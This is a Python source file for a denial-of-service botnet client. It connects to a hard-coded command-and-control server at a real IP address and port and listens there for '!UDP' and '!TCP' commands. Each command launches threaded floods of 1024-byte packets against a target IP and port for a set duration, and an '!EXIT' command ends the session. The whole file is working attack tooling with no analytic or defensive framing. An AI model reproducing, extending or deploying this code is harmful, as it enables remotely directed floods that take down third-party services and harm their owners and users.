import socket
import threading
import time

def send_udp_flood(target_ip, target_port, duration):
    """
    Sends a high volume of UDP packets to a specified target for a set duration.
    """
    try:
        print(f"Starting UDP flood to {target_ip}:{target_port} for {duration} seconds...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b"X" * 1024  # Example payload
        timeout = time.time() + duration
        
        while time.time() < timeout:
            sock.sendto(payload, (target_ip, target_port))
        
        print(f"UDP flood to {target_ip}:{target_port} completed.")
    except Exception as e:
        print(f"Error during UDP flood: {e}")
    finally:
        sock.close()

def send_tcp_flood(target_ip, target_port, duration):
    """
    Sends a high volume of TCP packets to a specified target for a set duration.
    """
    try:
        print(f"Starting TCP flood to {target_ip}:{target_port} for {duration} seconds...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        payload = b"X" * 1024  # Example payload
        timeout = time.time() + duration
        
        while time.time() < timeout:
            try:
                sock.send(payload)
            except Exception as e:
                print(f"Error sending TCP data: {e}")
                break
        
        print(f"TCP flood to {target_ip}:{target_port} completed.")
    except Exception as e:
        print(f"Error during TCP flood: {e}")
    finally:
        sock.close()

def handle_commands(server_ip, server_port):
    """
    Connects to the server and listens for commands.
    """
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((server_ip, server_port))
        print(f"Connected to server at {server_ip}:{server_port}")

        while True:
            command = client_socket.recv(1024).decode('utf-8').strip()
            if not command:
                continue
            
            print(f"Received command: {command}")

            if command.startswith("!UDP"):
                parts = command.split()
                if len(parts) == 4:
                    target_ip = parts[1]
                    target_port = int(parts[2])
                    duration = int(parts[3])
                    threading.Thread(target=send_udp_flood, args=(target_ip, target_port, duration)).start()
                else:
                    print("Invalid !UDP command format. Use: !UDP <ip> <port> <time>")

            elif command.startswith("!TCP"):
                parts = command.split()
                if len(parts) == 4:
                    target_ip = parts[1]
                    target_port = int(parts[2])
                    duration = int(parts[3])
                    threading.Thread(target=send_tcp_flood, args=(target_ip, target_port, duration)).start()
                else:
                    print("Invalid !TCP command format. Use: !TCP <ip> <port> <time>")

            elif command == "!EXIT":
                print("Exit command received. Closing connection.")
                break

            else:
                print(f"Unknown command: {command}")

    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()
        print("Connection closed.")

def main():
    SERVER_IP = "147.185.221.24"
    SERVER_PORT = 25615

    handle_commands(SERVER_IP, SERVER_PORT)

if __name__ == "__main__":
    main()
